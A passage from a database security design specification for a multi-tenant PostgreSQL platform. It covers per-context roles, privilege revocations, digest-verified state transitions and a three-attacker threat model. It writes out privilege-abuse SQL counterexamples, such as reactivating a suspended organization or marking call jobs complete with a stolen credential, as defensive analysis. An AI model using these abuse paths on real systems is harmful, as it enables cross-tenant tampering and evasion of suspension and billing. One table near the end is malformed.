| CTX-05 [OD-7I-18] | **Reconciling `app_worker` (A-6, A-7).** `app_worker` stays for background work that is not a durable consumer. The governed migration revokes from it: `INSERT` and `DELETE` on `crm.event_consumer_dedup` and `EXECUTE` on `crm.fn_claim_event`; `INSERT` on `billing.usage_events`; `EXECUTE` on `analytics.fn_ingest_analytics_event` and `fn_claim_projection_slot`; every write privilege on the IC-2 and IC-3 guard relations that no non-consumer worker task of the **same** context needs; the endpoint privileges of ADM-11; and every guard object added later (CON-10's fan-out claim). Where a non-consumer background task of a consuming context legitimately writes a guard relation (for example the Campaign scheduler on `call_jobs`), that task moves to its context's principal; it does not keep the privilege on `app_worker`. The end state is asserted by CTX-12, not by this list. |
| CTX-06 [7I] | **Inheritance and indirect paths.** No role is granted to another; the assertion block fails on any `pg_auth_members` row involving a context principal or `app_worker`. `PUBLIC` holds no privilege on any guard object or function. No `ALTER DEFAULT PRIVILEGES` exists. Every `SECURITY DEFINER` function that writes a guard object has its complete target ACL restated under PRV-28, because `CREATE OR REPLACE` keeps old grants and a table revocation does not close a definer path (PRV-29). Guard functions restricted to one context additionally check `session_user` (PRV-19). |
| CTX-07 [FROZEN] | **Tenant context is unchanged.** A context principal follows the sequence of TCX-03 with the envelope's organization (7F TEN-7F-01 … 04). RLS policies are unchanged and apply to it as to any non-bypass role. Per-context principals narrow *which objects* a credential reaches; they do not change *which organizations*: a stolen context credential still reaches every organization's rows in that context (RR-01). |
| CTX-08 [OD-7I-18] | **No alternative credential (A-7).** A consumer workload's secret-manager policy grants its own two credentials only (ROL-04). The deployment check that already refuses `app_migration` and `app_platform_admin` as a runtime identity (INV-03) is extended: a workload that registers as a member of a durable group refuses to start unless `session_user` is the principal bound to that group's context in the registry, and the gateway refuses to admit a member whose registry entry names a different principal. Because the completion function checks `session_user` (CEV-05), a consumer that somehow connected as another role could not produce acceptable evidence either. |
| CTX-09 [7I] | **Connection pools.** One pool per (workload, principal). A pool never holds connections of two principals, and no code path switches role inside a session (`SET ROLE` and `SET SESSION AUTHORIZATION` are unavailable to roles with no membership, and are prohibited by the CI rule of IR-29). TCX-07 pool hygiene applies per pool. Cost: up to nine more pools and their connection budgets, stated for 7K (HE-7K-7I-10). |
| CTX-10 [7I] | **Rotation and revocation.** Each principal's credential rotates with overlapping validity (ROL-01), independently of the others. Revoking one context's credential stops that context's consumers only; their entries stay pending and are redelivered. |
| CTX-11 [FROZEN] | **7F semantics preserved (A-8).** No guard, key, constraint, function body, transaction boundary or ordering rule of 7F §13 – §28 changes. The same statements run; only the role that runs them differs. Guards stay domain-owned. |
| CTX-12 [7I] | **Assertion.** The migration ends with a catalogue block that, for every guard object and guard function in a governed inventory derived from 7F §28, asserts the CTX-03 writer set exactly, using `has_table_privilege`, `has_column_privilege` and `has_function_privilege` over **every** login role, and fails otherwise. The inventory is a migration deliverable; it is not derived in this document, and this document does not claim to know every grant `app_worker` holds across 112 migrations. |
| CTX-13 [7I] | **Failure and recovery.** A missing grant surfaces as `42501` in a handler, which is `HANDLER_FAILED`: no acknowledgement, bounded retry, then a parked case (7G). Nothing is lost by an under-grant; an over-grant is what CTX-12 exists to catch. Roll-forward only: reverting the migration restores the shared-credential state and re-opens P1-7I-R11, so a downgrade is gated like IR-09's. |
| CTX-14 [7I] | **Other narrow principals.** The relay, dispatcher, sweeper, maintenance, tooling, gateway, journal and restore principals hold no table privilege anywhere (§8.2) and therefore no guard object. `app_readonly` holds `SELECT` only. `app_platform_admin` keeps the frozen 6M grants on billing and compliance relations it already holds; whether those are a forgery path for a platform-administrator credential is the same class as T-7I-06 and is bounded by part B, which that role cannot satisfy (it cannot execute `fn_record_completion`). |

**What part A closes, and what it leaves to part B.** Steps 2 and 3 of the reviewed counterexample fail for a credential stolen from a *different* context: the write to the target's guard is `42501`. Part A does not cover a credential of the *same* context, nor `app_api` on the shared state tables. Part B (§9.7) covers the same-context case for event-keyed guards. What neither part covers, the state-keyed guards, the owner declined to accept as a residual and is closed by §8.9.

### 8.9 Authorized business-state transitions for the state-guarded consumers (RR-08; OD-7I-19)

Nothing in this section exists. It is a requirement on a future governed migration (IR-44) with controlled errata to 5B, 5E, 5F, 6C, 6H and 7F (ERR-7I-17). It is confined to the state that five consumers decide on. It is not a redesign of the tenancy model, and RR-01 remains for everything outside it.

**The defect.** CON-02, CON-03, CON-05, CON-09 and CON-11 use state-keyed guards (CEV-06a ii). A handler that finds the owner's state already advanced correctly does nothing. Per-context principals and completion evidence do not help when the state was advanced by a principal that *is* entitled to write the table: the owning context's own credential, or `app_api`, which holds direct `UPDATE` on the same tables for the tenant API. Both set `app.tenant_id` freely.

**Three attackers, kept apart** (owner condition 5).

| | Attacker | Holds | Aim |
|---|---|---|---|
| **A** | Stolen database credential, direct SQL | One login password (`app_api`, `app_worker` or a context principal). No signing key, no gateway identity | `UPDATE … SET status = …` on a guard column |
| **B** | Stolen database credential, forging an API action | The same, and it calls the guarded function a real API request would call, with invented arguments | The same mutation through the function |
| **C** | A fully compromised, legitimately authorized workload | The process itself: its database credential **and** its signing key or gateway identity | Anything that workload is authorized to do |

A and B are prevented below. C is not, and is not claimed to be (STP-16).

**Physical facts (static reading).** `pgcrypto` is installed (`001_5B` L11), so a keyed digest can be verified inside a function. Frozen precedent for moving a state column behind functions: `078_5F1` L98 and `090_5F10` L40 revoke `UPDATE` on `knowledge.documents` from `app_api` and `app_worker`.

| Consumer | Authoritative state the handler decides on | Physical grants today | Legitimate writers | Frozen guard (unchanged) | Attacker path today |
|---|---|---|---|---|---|
| CON-02 seeding | Existence of an `ACTIVE` row in `organization.compliance_policies` (`status`; `uq_compliance_policy_active`, `004_5B`) | `SELECT, INSERT, UPDATE` to `app_api`, `app_worker` (`004_5B` L50); all DML to `app_platform_admin` (`008_5B` L37) | The seed (this consumer); the tenant's policy creation and activation (6C) | `INSERT … ON CONFLICT … WHERE status = 'ACTIVE' DO NOTHING` | Insert an `ACTIVE` row, or update a draft to `ACTIVE`, for any organization: the seed conflicts and the organization runs on an attacker-written policy |
| CON-03 pointer | Authoritative: which policy is `ACTIVE`. Derived: `organization.organizations.compliance_policy_id` (`003_5B` L31) | `SELECT, INSERT, UPDATE` on `organizations` to `app_api`, `app_worker` (`003_5B` L54) | Activation (6C); this consumer's recomputation | Lock the organization row, recompute from `status = 'ACTIVE'` (IC-4) | Write the pointer directly; or change which policy is `ACTIVE` as for CON-02 |
| CON-05 outcome | `campaign.call_jobs.status`; `campaign.campaign_contacts.status` and the qualification facts (`030_5E`, `031_5E`) | `SELECT, INSERT, UPDATE` on both to `app_api`, `app_worker` (`030_5E` L50, `031_5E` L38); all DML to `app_platform_admin` (`033_5E`) | Enqueue (`campaign.fn_enqueue_contact`, `098_5E1`); the scheduler's dispatch; this consumer; tenant pause and cancel (6H) | `UPDATE call_jobs … WHERE status = 'DISPATCHED'`, then the contact compare-and-swap (6H §24.1) | Move the job out of `DISPATCHED`: the outcome, the contact update, the retry decision and the `campaign.contact.call_attempted` event (which Billing consumes) never happen |
| CON-09 count | Authoritative: rows and `status` of `knowledge.documents`. Derived: `knowledge.knowledge_bases.document_count` (`035_5F` L19) | `knowledge_bases`: `SELECT, INSERT, UPDATE` (`035_5F` L39). `documents`: `SELECT, INSERT`; `UPDATE` already revoked (`078_5F1`, `090_5F10`) | Document functions of 5F; this consumer's recount | Lock the knowledge-base row, recount (IC-4) | Write `document_count` directly. Document `status` is already function-only |
| CON-11 import | `campaign.csv_import_jobs.status` (`028_5E`) | `SELECT, INSERT, UPDATE` to `app_api`, `app_worker` (`028_5E` L61) | Job creation (6H-017); the completion route (6H-018); this consumer; the import task; the stale-job reaper | The single compare-and-swap `PENDING → PROCESSING` (6H §13.2) | Set `PROCESSING` directly: nothing starts the import and the job looks started |

No frozen 6M route reads or writes any of these relations.

| ID | Rule |
|---|---|
| STP-01 [OD-7I-19] | **Guard columns.** The governed inventory of guard columns is: `compliance_policies.status`; `organizations.compliance_policy_id`; `call_jobs.status`; `campaign_contacts.status`, `qualification_result`, `qualification_reason` and the attempt-identity columns the 6H guard reads; `csv_import_jobs.status`; `knowledge_bases.document_count`. `knowledge.documents.status` is already function-only and is listed for the assertion. The migration may add a column to this inventory; it may not remove one. |
| STP-02 [OD-7I-19] | **No direct write of a guard column by any login role.** Table-level `UPDATE` on each relation of STP-01 is revoked from `app_api`, `app_worker`, every context principal and `app_platform_admin`, and replaced by column-level `UPDATE` on the non-guard columns that each role's frozen paths write (the PAS-02 mechanism; a column-level revoke under a table-level grant would do nothing). `DELETE` on these relations is revoked from `app_platform_admin`, the only role that holds it. A guard column is then written only inside a `SECURITY DEFINER` function owned by the migration role. This is the `078_5F1` precedent applied to seven more columns. |
| STP-03 [OD-7I-19] | **Insertion cannot create an advanced state.** `INSERT` stays where a frozen path needs it (policy drafts, import jobs, enqueued jobs and contacts), but a row-level `BEFORE INSERT` trigger rejects any row whose guard column is not the state machine's initial value unless `current_user` is the function-owner role. Inside a definer function `current_user` is the owner; a direct caller can never be, because no login role is a member of the owner (§8.5). The trigger takes no flag and reads no session setting (PRV-18). The seed's `ACTIVE` insert therefore happens only inside its function. |
| STP-04 [OD-7I-19] | **Every edge has a named cause.** For each guard column the migration fixes a transition matrix: each permitted edge, the function that performs it, and which of four causes authorizes it: `EVENT` (a durable consumer handling a delivered event), `API` (an authenticated tenant request), `INTERNAL` (the owning context continuing work the database already recorded, under a database-issued claim), or `RECOMPUTE` (STP-08). An edge with no cause in the matrix is not expressible. The matrix restates the frozen 6C and 6H state machines; it adds no state and no edge. |
| STP-05 [OD-7I-19] | **`EVENT` transitions verify a delivery in the database.** The function is executable by the owning context's principal only and checks `session_user`. It requires the delivery token and **verifies its database-verifiable code** (CEV-02) with `pgcrypto`, then checks that the token's group is the consumer the edge belongs to, that its `event_id` and organization equal the arguments and the tenant context, that its event type is one the matrix admits for this edge, and that it has not expired. Only then does it run the frozen compare-and-swap and its dependent statements, and it writes the completion record and the provenance row in the same transaction. A caller that holds the context's database credential but no genuine delivery cannot pass (attacker A and B). The recovery path presents an operation-item reference instead, verified against the ledger (CEV-13). |
| STP-06 [OD-7I-19] | **`API` transitions verify an action proof in the database.** The function is executable by `app_api` only and checks `session_user`. It requires an **action proof**: a keyed digest, under the API action key, over a length-prefixed encoding of the purpose label, `organization_id`, the authenticated principal (user or API-key identifier), the permission 6B evaluated, the transition code, the target row identifier, a unique request identifier and an expiry. The API workload mints it after 6B authentication and authorization have succeeded for that request. The function verifies the code with `pgcrypto`, requires every bound field to equal its arguments and the tenant context, requires the expiry to be in the future, and records the request identifier in the provenance row under a unique constraint, so a proof is good for one transition of one row once. The tenant-forgery guard of `101_5I1` stays, but it is no longer the only thing between a database credential and the mutation: a caller who can set `app.tenant_id` but cannot mint the proof is refused (attacker B). |
| STP-07 [OD-7I-19] | **`INTERNAL` transitions carry a database-issued claim.** Work that the owning context continues by itself (the import task finishing a `PROCESSING` job; the stale-job reaper; the scheduler moving an enqueued job to `DISPATCHED`) is authorized by state-machine legality plus a claim value the database returned when the preceding edge committed, re-read under the row lock (PRV-18). No `INTERNAL` edge leaves a state that a consumer's guard tests: `DISPATCHED → terminal` and `PENDING → PROCESSING` are `EVENT` or `API` edges only. A stolen Campaign credential can therefore start legal internal work but cannot make a consumer's transition appear done. |
| STP-08 [OD-7I-19] | **`RECOMPUTE` functions take no value.** `organizations.compliance_policy_id` and `knowledge_bases.document_count` are written only by functions whose sole argument is the row to recompute. Each locks the consumer-side row and computes the value from the authoritative state in later statements of the same transaction, exactly as 7F TXA-05 requires. There is no argument through which a caller can choose the result, so no authorization proof is needed: the worst a stolen credential can do by calling one is make the derived value correct. They are executable by the owning context's principal. This preserves IC-4: the consumer still recomputes from authoritative state and is never asked whether the current event caused that state (owner condition 2). |
| STP-09 [OD-7I-19] | **The authoritative state behind a recomputation is protected by the other rules.** For CON-03 that state is `compliance_policies.status`, covered by STP-02 … STP-06. For CON-09 it is `knowledge.documents`: `status` is already function-only; direct `INSERT` is confined to the initial status by STP-03. Whether a row in its initial status is counted is the frozen 6F predicate's matter and is not changed. |
| STP-10 [OD-7I-19] | **Keys.** Two verification keys are held in a protected relation on which no login role has any privilege, read only inside the definer functions: the database-verifiable delivery key (shared with the gateway) and the API action key (shared with the API workload). Each has versions and identifiers, is loaded and rotated by a governed operation and never appears in a migration file, a log or a function argument. Rotation overlaps: the functions accept the current and the previous version. Because the keys are symmetric, anything that can read that relation can mint: the migration role, a superuser and a reader of a database backup. Those are already outside every runtime boundary of this document; a restored database rotates both keys before activation (JRN-13, step 7). |
| STP-11 [OD-7I-19] | **Provenance.** Every guarded transition writes, in its own transaction, one insert-only row: relation, row identifier, organization, from-state and to-state, cause, and the cause's evidence (group and `event_id`; or principal, permission and request identifier; or the claim; or `RECOMPUTE`), the key version, `session_user` and the time. No runtime role has a table privilege on it. It is class `PID`. A state with no provenance row for its last transition cannot arise through any runtime role; if one is ever found it is an integrity alarm (HE-7J-7I-11) and the row is not trusted. Provenance is supporting evidence and audit; the preventive control is STP-02 … STP-08. |
| STP-12 [FROZEN] | **7F semantics preserved.** Each guard keeps its frozen form: the conflict insert of CON-02, the compare-and-swap pair of CON-05, the single compare-and-swap of CON-11, lock-then-recompute for CON-03 and CON-09. The statements move inside owning-context functions; their predicates, their transaction boundary, their "0 rows means no effect" outcome and their ordering classes do not change. **No event-ID guard is added to any of the five** (EID-08 stands). A handler that finds the state advanced still does nothing, records its completion (CEV-06a ii) and is acknowledged: the difference is that the state it trusts can now have been produced only by an authorized cause. |
| STP-13 [7I] | **Crash, retry, concurrency.** A function is one transaction of the caller: state, dependents, outbox rows, completion and provenance commit together or not at all. A retried `EVENT` call with a fresh token meets the frozen guard and changes nothing. A retried `API` call with the same proof finds its request identifier and returns the recorded outcome, which gives the frozen idempotent response without a second transition; a retry with a new proof meets the state guard. Concurrent callers are arbitrated by the same row locks and unique indexes as before. Lock order is unchanged because the functions take the locks the frozen statements took. |
| STP-14 [7I] | **Compatibility.** No route, request or response shape, permission string, error code or event schema changes. A refused proof is an internal failure of a platform component, surfaced through the existing error envelope as the existing server-error class; it is not a new tenant-visible condition, because a genuine API request always carries a valid proof. 6C policy creation and activation, organization creation and seeding, 6H enqueue, outcome, pause, cancel, import creation and completion, and 6F document handling keep their behaviour; what changes is the statement each issues. |
| STP-15 [7I] | **Assertion and tenant isolation.** The migration ends with a catalogue block: for every guard column, `has_column_privilege(role, …, 'UPDATE')` is false for every login role and `has_table_privilege(…, 'UPDATE')` is false for the relation; each transition function's ACL equals its target set (PRV-28); the key relation and the provenance relation have no grantee. Every function compares its organization argument with the tenant context and with the bound field of the token or proof, so a proof or token of organization A cannot move a row of B. RLS is unchanged. |
| STP-16 [OD-7I-19] | **What is and is not claimed.** *Prevented:* A, for every login role, because no role can write a guard column; B, because the function demands a code the credential holder cannot compute; a cross-organization or cross-row reuse of a genuine token or proof; replay of a proof. *Not prevented, and not claimed:* C. A compromised API process holds the action key and can authorize any transition the tenant API can perform, for any organization. A compromised consumer worker holds its gateway identity and can obtain real deliveries. A compromised gateway together with a context credential can do the same. Supporting controls for C are audit, provenance and the 7J signals; they detect and attribute, they do not prevent. *Outside this section:* tenant content that is not a guard (a draft policy's fields, a contact's attributes, a document row in its initial status) is still writable under a stolen `app_api` credential by the frozen tenancy model (RR-01). |

**Consumer by consumer, after IR-44.**

| Consumer | Enforcement | Trusted authorization source | Evidence committed with the change | Migration requirement | Test |
|---|---|---|---|---|---|
| CON-02 | Direct insert confined to `DRAFT` (STP-03); `→ ACTIVE` only by the seed function (`EVENT`, token for `organization.created` on CON-02's group) or the activation function (`API`, proof for the 6C activation permission) | Gateway delivery; 6B-authorized request | Completion and provenance; the 6C audit row of an activation, same transaction | Column grants on `compliance_policies`; trigger; two functions | VT-91, VT-92 |
| CON-03 | `compliance_policy_id` not writable by any role; value-free recompute (STP-08); the `ACTIVE` state protected as for CON-02 | None needed for the pointer; as CON-02 for the source | Completion and provenance (`RECOMPUTE`) | Column grants on `organizations` excluding the pointer; one function | VT-91, VT-93 |
| CON-05 | `call_jobs.status` and the contact state columns not writable by any role; the outcome function (`EVENT`, token for `call.ended`, `call.failed` or `conversation.qualification_set` on CON-05's group) performs the frozen compare-and-swap pair, the outbox rows and the completion; pause and cancel are `API` edges; dispatch is `INTERNAL` and cannot leave `DISPATCHED` | Gateway delivery; 6B-authorized request; database-issued claim | Completion, provenance, the `campaign.contact.call_attempted` outbox row, one transaction | Column grants on both relations; trigger; the function set of the 6H job and contact state machines; superseding ACL of `fn_enqueue_contact` | VT-91, VT-92, VT-94 |
| CON-09 | `document_count` not writable by any role; value-free recount (STP-08); document `status` already function-only; direct insert confined to the initial status | None needed | Completion and provenance (`RECOMPUTE`) | Column grants on `knowledge_bases` excluding the count; trigger on `documents`; one function | VT-91, VT-93 |
| CON-11 | Direct insert confined to `PENDING`; `PENDING → PROCESSING` only by the start function, as an `EVENT` edge (token for `import.job_created` on CON-11's group) or an `API` edge (proof for the completion route); later edges `INTERNAL` under the start claim | Gateway delivery; 6B-authorized request; database-issued claim | Completion and provenance | Column grants on `csv_import_jobs`; trigger; start, finish and reaper functions | VT-91, VT-92, VT-94 |

**The exploit, closed.** *A.* With a stolen Campaign (or `app_api`, or `app_worker`) password and any tenant context: `UPDATE campaign.call_jobs SET status = 'COMPLETED' WHERE …` fails with `42501 permission denied for table call_jobs`, because no login role holds `UPDATE` on that column or on the table. *B.* The same holder calls the outcome function: without a delivery token whose code verifies under a key it cannot read, the function raises before touching a row; with a token copied from a real delivery of another event, group or organization, the bound-field check raises. It calls the cancel function: without an action proof it cannot compute, the function raises. *C.* A compromised Campaign consumer process, holding its gateway identity, receives a real `call.ended` delivery and can run the outcome function with attacker-chosen outcome arguments. That is the owning domain's own authorized workload misbehaving, it is confined to Campaign, it leaves a completion and a provenance row naming the event, and it is not prevented. Until IR-44 exists attackers A and B both succeed, and AB-7I-11 blocks every durable consumer. Tests: VT-91 … VT-95.

### 8.10 Organization-row privileges and lifecycle authority (P1-7I-R13, lifecycle part; OD-7I-21)

Nothing in this section exists. It is a requirement on a future governed migration (IR-45) with controlled errata to 5B, 6C and 6M (ERR-7I-19). It protects the organization's lifecycle status. It is a **separate inventory** from STP-01: STP-01 protects state that an event handler's idempotency guard reads; this section protects who may change an organization's lifecycle. No gateway delivery token is involved in any rule below.

**The counterexample, on the executed schema.** The platform suspends organization A through `organization.fn_platform_suspend_organization` (`107_5B5` L345 – L400). A holder of the `app_api` or `app_worker` login runs `UPDATE organization.organizations SET status = 'ACTIVE' WHERE id = …`. The statement succeeds. `chk_orgs_status` admits the value. No audit row is written. The next 7H admission share-locks the row, reads `ACTIVE` and proceeds (7H ADM-01, T-04a). The same statement on a `CANCELLED` row also succeeds, and so does it for an organization the session has nothing to do with: the table has no row-level security.

**Physical facts (static reading of all 112 migrations for every statement that names `organization.organizations`).**

| Triggers | Two: `trg_organizations_currency_immutable`, `trg_organizations_updated_at`. None concerns `status`, `data_residency_profile` or `region_ref` | `003_5B` L52 – L53 |
| Constraints | `chk_orgs_status` (three values); `chk_orgs_residency_profile` (three values). Neither restricts a transition | `003_5B` L41, L45 |
| `SECURITY DEFINER` functions that write the table | Two names only: `fn_platform_suspend_organization`, `fn_platform_reactivate_organization` (created `105_5B4`, replaced `107_5B5`). Both set `status` and `updated_at` and nothing else. `EXECUTE`: `app_platform_admin` only since `107_5B5` L401 – L403, L461 – L463 | `105_5B4`, `107_5B5` |

No `ALTER DEFAULT PRIVILEGES`. No role is granted to another (§8.5) | Search |

The setting is one the same session can set. `p_admin_user_id` is an unverified argument | `107_5B5` |

This is text inspection, not a catalogue query. VT-96 is the catalogue assertion.

**So the review's counterexample is real, and wider than stated:** the early grant is still in force, it is cross-tenant because the table has no RLS, and it covers every column. STP-02 (§8.9) already withdraws table-level `UPDATE` on this relation and replaces it by column grants "on the non-guard columns that each role's frozen paths write". Frozen 6C writes `status` directly from `app_api` (§15.6, §15.7, the compare-and-swap of §7.6), so that rule alone would have re-granted the column. HE-7L-7I-10 had recorded the grant as an unrated note for 7L. It is a freeze blocker and is closed here.
